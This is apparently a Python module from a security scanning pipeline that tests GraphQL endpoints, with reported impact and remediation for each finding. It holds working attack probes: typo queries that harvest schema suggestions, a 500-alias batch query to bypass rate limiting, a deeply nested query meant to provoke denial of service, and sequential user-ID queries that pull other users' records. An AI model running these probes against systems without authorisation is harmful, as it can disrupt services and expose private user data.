"""GraphQL schema inference and attack generation engine."""

import json
import re
from typing import Any, Dict, List, Optional, Set
from urllib.parse import urlsplit

import requests

from modules.pipeline.engine.models import Evidence, ValidationResult
from modules.pipeline.utils.logger import logger


class GraphQLSchemaInference:
    """Infer GraphQL schema without introspection using field suggestions."""

    COMMON_FIELDS = [
        "id", "name", "email", "password", "token", "admin", "user", "users", "query",
        "mutation", "me", "viewer", "node", "edges", "cursor", "totalCount", "pageInfo",
        "firstName", "lastName", "role", "permissions", "secret", "apiKey"
    ]

    def __init__(self, target: str, timeout: int = 8):
        self.target = target
        self.timeout = timeout
        self.discovered_types: Dict[str, List[str]] = {}

    def infer_fields(self) -> Dict[str, List[str]]:
        """Infer available fields via typo suggestions."""
        for field in self.COMMON_FIELDS:
            # Intentional typo to trigger "Did you mean?" suggestions
            typo = field[0] + "X" + field[1:]
            try:
                resp = requests.post(
                    self.target,
                    json={"query": f"{{ {typo} {{ id }} }}"},
                    headers={"Content-Type": "application/json"},
                    timeout=self.timeout,
                    allow_redirects=False,
                )
                if "did you mean" in (resp.text or "").lower():
                    # Extract suggested fields from error
                    matches = re.findall(r'Did you mean.*?"(\w+)"', resp.text or "")
                    if matches:
                        self.discovered_types["root"] = list(set(self.discovered_types.get("root", []) + matches))
            except Exception:
                pass

        return self.discovered_types


class GraphQLDeepValidator:
    """Enhanced GraphQL attack validator."""

    validator_id = "graphql_deep_validator"
    priority = 85

    def __init__(self):
        self.destructive = False

    def can_run(self, state: Dict[str, Any]) -> bool:
        endpoints = [str(x).lower() for x in (state.get("endpoints") or [])]
        return any("graphql" in ep for ep in endpoints)

    def _post(self, url: str, query: str, headers: Optional[Dict[str, str]] = None) -> Optional[requests.Response]:
        h = {"Content-Type": "application/json", "User-Agent": "validator/1.0"}
        if headers:
            h.update(headers)
        try:
            return requests.post(
                url,
                json={"query": query},
                headers=h,
                timeout=8,
                allow_redirects=False,
            )
        except Exception as e:
            logger.debug(f"GraphQL request failed: {e}")
            return None

    def run(self, state: Dict[str, Any]) -> Optional[ValidationResult]:
        endpoints = [e for e in (state.get("endpoints") or []) if "graphql" in str(e).lower()]
        if not endpoints:
            return None

        for endpoint in endpoints:
            # Test 1: Alias-based batch query to bypass rate limiting
            aliases = " ".join([f"q{i}:__typename" for i in range(500)])
            batch_query = f"{{ {aliases} }}"
            resp = self._post(endpoint, batch_query)
            if resp and resp.status_code == 200 and resp.text and "typename" in resp.text:
                logger.warning(f"GraphQL: batch query bypass confirmed on {endpoint}")
                return ValidationResult(
                    success=True,
                    confidence=0.85,
                    severity="medium",
                    vulnerability="graphql-batch-query-bypass",
                    evidence=Evidence(
                        request={"target": endpoint, "query": batch_query[:100]},
                        response={"status": resp.status_code},
                        matched="batch_aliases",
                    ),
                    impact="Alias-based queries can bypass rate limiting and enable DoS attacks.",
                    remediation="Implement query cost analysis and depth limits for all GraphQL operations.",
                )

            # Test 2: Deep nesting to trigger timeout/DoS
            depth_query = "query { " + "a { " * 16 + "id" + " }" * 16 + " }"
            resp = self._post(endpoint, depth_query)
            if resp and (resp.status_code >= 500 or resp.elapsed.total_seconds() > 5):
                logger.warning(f"GraphQL: deep nesting DoS confirmed on {endpoint}")
                return ValidationResult(
                    success=True,
                    confidence=0.8,
                    severity="high",
                    vulnerability="graphql-deep-nesting-dos",
                    evidence=Evidence(
                        request={"target": endpoint, "depth": 16},
                        response={"status": resp.status_code, "time": str(resp.elapsed)},
                        matched="deep_nesting",
                    ),
                    impact="Deep query nesting can cause server DoS due to lack of depth limits.",
                    remediation="Implement query depth limits and timeouts for GraphQL operations.",
                )

            # Test 3: Object IDOR Validation
            idor_query = "query { user(id: %d) { id email name } }"
            try:
                headers = {"Cookie": state.get("cookie")} if state.get("cookie") else None
                resp1 = self._post(endpoint, idor_query % 1, headers=headers)
                resp2 = self._post(endpoint, idor_query % 2, headers=headers)
                if resp1 and resp2 and resp1.status_code == 200 and resp2.status_code == 200:
                    try:
                        data1 = resp1.json().get("data", {}).get("user")
                        data2 = resp2.json().get("data", {}).get("user")
                        if data1 and data2 and data1 != data2:
                            logger.warning(f"GraphQL: IDOR confirmed on {endpoint}")
                            return ValidationResult(
                                success=True,
                                confidence=0.9,
                                severity="high",
                                vulnerability="graphql-idor",
                                evidence=Evidence(
                                    request={"target": endpoint, "query": "user(id: 1...2)"},
                                    response={"id_1": data1, "id_2": data2},
                                    matched="cross-tenant_data_leakage",
                                ),
                                impact="Cross-tenant data leakage via predictable object identifiers.",
                                remediation="Implement robust object-level authorization checks inside GraphQL resolvers.",
                            )
                    except ValueError:
                        pass
            except Exception as e:
                logger.debug(f"GraphQL IDOR test failed: {e}")

        return None
